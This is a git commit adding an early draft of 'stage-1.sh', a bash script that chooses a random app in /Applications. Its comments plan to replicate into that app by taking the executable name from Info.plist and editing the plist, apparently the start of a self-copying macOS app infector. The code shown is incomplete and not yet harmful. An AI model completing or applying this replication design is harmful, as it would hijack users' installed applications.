6fcfae09e60267463e9e3c014017c524167d9f0b
The-SamminAter <48739810+The-SamminAter@users.noreply.github.com>
2020-09-23 14:16:14 -0700

    Start re-writing stage 1

--- stage-1.sh
+++ stage-1.sh
@@ -1,1 +1,12 @@
+#!/bin/bash
+#This is stage 1, re-written
+#I decided to re-write stage 1 as it probably doesn't work at all,
+#and also is more commentary than code
+#Anywho, I present to you, stage 1:
 
+#Application roulette; coppied from stage-1-old, and needs to be tested:
+loc=(/Applications/*)
+APPDIR="${loc[RANDOM % ${#loc[@]}]}/"
+#For the next part (replication), instead of trying to use the output of
+#ls, this script will read a target's Info.plist and use the value of the 
+#CFBundleExecutable to both name its copy, and edit the Info.plist
